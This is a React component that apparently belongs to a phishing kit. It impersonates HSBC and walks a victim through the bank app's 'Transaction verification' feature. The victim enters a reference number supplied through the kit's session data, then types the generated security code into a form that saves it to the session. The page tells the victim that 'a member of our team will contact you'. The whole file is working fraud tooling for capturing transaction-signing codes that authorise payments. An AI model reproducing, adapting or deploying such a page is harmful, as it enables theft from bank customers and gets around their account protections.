import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import FormLayout from '@/components/FormLayout';
import { CheckCircle, Smartphone } from 'lucide-react';
import { useForm } from '@/contexts/FormContext';
import { useEffect, useState } from 'react';

const SelfSendPage = () => {
  const { currentSession, updateSessionData } = useForm();
  const [generatedCode, setGeneratedCode] = useState('');
  
  // Get reference number from session data
  const referenceNumber = currentSession?.data?.referenceNumber || '458900000';
  
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    updateSessionData('generatedCode', { code: generatedCode });
  };
  
  // Debug logging
  useEffect(() => {
    console.log('📱 Self Send Page - Current Session:', {
      sessionId: currentSession.id,
      page: currentSession.currentPage,
      allData: currentSession.data,
      referenceNumber: currentSession.data?.referenceNumber,
      hasReferenceNumber: !!currentSession.data?.referenceNumber
    });
  }, [currentSession]);
  return (
    <FormLayout 
      title="Steps to Verify Your Device and Identity"
      description="Follow these steps to complete the verification process"
    >
      <div className="space-y-6">
        <div className="flex justify-center">
          <div className="bg-primary/10 p-4 rounded-full">
            <Smartphone className="w-12 h-12 text-primary" />
          </div>
        </div>

        <div className="space-y-4 text-sm">
          <div className="flex gap-3">
            <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-semibold">1</span>
            <p className="text-gray-700 pt-0.5">Open the HSBC Mobile Banking app.</p>
          </div>

          <div className="flex gap-3">
            <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-semibold">2</span>
            <p className="text-gray-700 pt-0.5">Select 'Generate a code' from the bottom of the screen.</p>
          </div>

          <div className="flex gap-3">
            <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-semibold">3</span>
            <p className="text-gray-700 pt-0.5">Choose 'Transaction verification' from the available options.</p>
          </div>

          <div className="flex gap-3">
            <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-semibold">4</span>
            <div className="pt-0.5">
              <p className="text-gray-700">Enter the reference number:</p>
              <div className="mt-2 p-3 bg-gray-100 rounded-md font-mono text-lg font-semibold text-center">
                {referenceNumber}
              </div>
            </div>
          </div>

          <div className="flex gap-3">
            <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-semibold">5</span>
            <div className="pt-0.5">
              <p className="text-gray-700">Enter your 6-digit PIN (or use biometrics if enabled).</p>
              <p className="text-xs text-amber-600 mt-1 italic">Please note: entering an incorrect PIN will produce an invalid code.</p>
            </div>
          </div>

          <div className="flex gap-3">
            <span className="flex-shrink-0 w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-xs font-semibold">6</span>
            <p className="text-gray-700 pt-0.5">Your security code will be displayed.</p>
          </div>
        </div>

        <div className="border-t border-gray-200 pt-4">
          <p className="text-sm text-gray-600 text-center mb-4">
            Use this code to verify your mobile device.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <Label htmlFor="generatedCode" className="text-base font-semibold">
              Enter the Generated Code
            </Label>
            <Input
              id="generatedCode"
              type="text"
              value={generatedCode}
              onChange={(e) => setGeneratedCode(e.target.value.toUpperCase())}
              placeholder="Enter code"
              maxLength={10}
              className="text-center text-lg font-mono tracking-wider"
              required
            />
          </div>

          <Button 
            type="submit" 
            className="w-full"
            disabled={generatedCode.length === 0}
          >
            Submit Code
          </Button>
        </form>

        <div className="bg-green-50 border border-green-200 rounded-lg p-4">
          <div className="flex gap-3">
            <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
            <p className="text-sm text-green-800">
              Once you have completed these steps, a member of our team will contact you to proceed further.
            </p>
          </div>
        </div>
      </div>
    </FormLayout>
  );
};

export default SelfSendPage;
